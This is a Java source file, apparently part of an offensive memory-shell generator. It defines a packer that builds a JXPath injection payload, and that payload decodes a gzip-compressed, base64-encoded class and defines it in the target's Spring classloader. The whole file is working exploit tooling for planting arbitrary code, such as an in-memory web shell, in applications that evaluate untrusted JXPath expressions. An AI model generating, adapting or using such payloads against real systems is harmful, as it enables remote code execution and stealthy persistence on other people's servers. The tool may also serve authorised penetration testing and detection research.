package org.leo.jmg.mem.packer.jxpath;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

import static org.leo.jmg.mem.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

@PackerMeta(name = "JXPathSpringGzipJDK17", group = "JXPath", order = 3)
public class JXPathSpringGzipJDK17Packer implements Packer {
    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", PackerRegistry.getOrThrow("GzipBase64").pack(config));
    }
}
